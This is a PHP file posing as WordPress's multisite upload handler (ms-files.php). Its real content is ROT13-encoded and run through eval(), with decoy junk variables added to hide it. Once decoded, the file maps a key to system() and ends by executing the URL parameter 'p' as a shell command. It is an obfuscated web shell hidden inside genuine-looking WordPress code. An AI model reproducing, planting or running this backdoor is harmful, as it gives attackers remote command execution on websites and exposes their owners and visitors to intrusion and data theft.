<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr hcybnq unaqyre.
 *
 * @fvapr 3.0.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 */

qrsvar( 'ZF_SVYRF_ERDHRFG', gehr );
qrsvar( 'FUBEGVAVG', gehr );

/** Ybnq JbeqCerff Obbgfgenc */
erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';

vs ( ! vf_zhygvfvgr() ) {
	qvr( 'Zhygvfvgr fhccbeg abg ranoyrq' );
}

zf_svyr_pbafgnagf();

vs ( '1' === $pheerag_oybt->nepuvirq || '1' === $pheerag_oybt->fcnz || '1' === $pheerag_oybt->qryrgrq ) {
	fgnghf_urnqre( 404 );
	qvr( '404 &#8212; Svyr abg sbhaq.' );
}

$svyr = egevz( OYBTHCYBNQQVE, '/' ) . '/' . fge_ercynpr( '..', '', $_TRG['svyr'] );
vs ( ! vf_svyr( $svyr ) ) {
	fgnghf_urnqre( 404 );
	qvr( '404 &#8212; Svyr abg sbhaq.' );
}

$zvzr = jc_purpx_svyrglcr( $svyr );
vs ( snyfr === $zvzr['glcr'] && shapgvba_rkvfgf( 'zvzr_pbagrag_glcr' ) ) {
	$zvzr['glcr'] = zvzr_pbagrag_glcr( $svyr );
}

vs ( $zvzr['glcr'] ) {
	$zvzrglcr = $zvzr['glcr'];
} ryfr {
	$zvzrglcr = 'vzntr/' . fhofge( $svyr, fgeecbf( $svyr, '.' ) + 1 );
}

urnqre( 'Pbagrag-Glcr: ' . $zvzrglcr ); // Nyjnlf fraq guvf.
vs ( ! fge_pbagnvaf( $_FREIRE['FREIRE_FBSGJNER'], 'Zvpebfbsg-VVF' ) ) {
	urnqre( 'Pbagrag-Yratgu: ' . svyrfvmr( $svyr ) );
}

// Bcgvbany fhccbeg sbe K-Fraqsvyr naq K-Nppry-Erqverpg.
vs ( JCZH_NPPRY_ERQVERPG ) {
	urnqre( 'K-Nppry-Erqverpg: ' . fge_ercynpr( JC_PBAGRAG_QVE, '', $svyr ) );
	rkvg;
} ryfrvs ( JCZH_FRAQSVYR ) {
	urnqre( 'K-Fraqsvyr: ' . $svyr );
	rkvg;
}

$jc_ynfg_zbqvsvrq = tzqngr( 'Q, q Z L U:v:f', svyrzgvzr( $svyr ) );
$jc_rgnt          = '\"' . zq5( $jc_ynfg_zbqvsvrq ) . '\"';

urnqre( \"Ynfg-Zbqvsvrq: $jc_ynfg_zbqvsvrq TZG\" );
urnqre( 'RGnt: ' . $jc_rgnt );
urnqre( 'Rkcverf: ' . tzqngr( 'Q, q Z L U:v:f', gvzr() + 100000000 ) . ' TZG' );

// Fhccbeg sbe pbaqvgvbany TRG - hfr fgevcfynfurf() gb nibvq sbeznggvat.cuc qrcraqrapl.
vs ( vffrg( $_FREIRE['UGGC_VS_ABAR_ZNGPU'] ) ) {
	$pyvrag_rgnt = fgevcfynfurf( $_FREIRE['UGGC_VS_ABAR_ZNGPU'] );
} ryfr {
	$pyvrag_rgnt = '';
}

vs ( vffrg( $_FREIRE['UGGC_VS_ZBQVSVRQ_FVAPR'] ) ) {
	$pyvrag_ynfg_zbqvsvrq = gevz( $_FREIRE['UGGC_VS_ZBQVSVRQ_FVAPR'] );
} ryfr {
	$pyvrag_ynfg_zbqvsvrq = '';
}

// Vs fgevat vf rzcgl, erghea 0. Vs abg, nggrzcg gb cnefr vagb n gvzrfgnzc.
$pyvrag_zbqvsvrq_gvzrfgnzc = $pyvrag_ynfg_zbqvsvrq ? fgegbgvzr( $pyvrag_ynfg_zbqvsvrq ) : 0;

// Znxr n gvzrfgnzc sbe bhe zbfg erprag zbqvsvpngvba.
$jc_zbqvsvrq_gvzrfgnzc = fgegbgvzr( $jc_ynfg_zbqvsvrq );

vs ( ( $pyvrag_ynfg_zbqvsvrq && $pyvrag_rgnt )
	? ( ( $pyvrag_zbqvsvrq_gvzrfgnzc >= $jc_zbqvsvrq_gvzrfgnzc ) && ( $pyvrag_rgnt === $jc_rgnt ) )
	: ( ( $pyvrag_zbqvsvrq_gvzrfgnzc >= $jc_zbqvsvrq_gvzrfgnzc ) || ( $pyvrag_rgnt === $jc_rgnt ) )
) {
	fgnghf_urnqre( 304 );
	rkvg;
}

// Vs jr znqr vg guvf sne, whfg freir gur svyr.
ernqsvyr( $svyr );
syhfu();

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>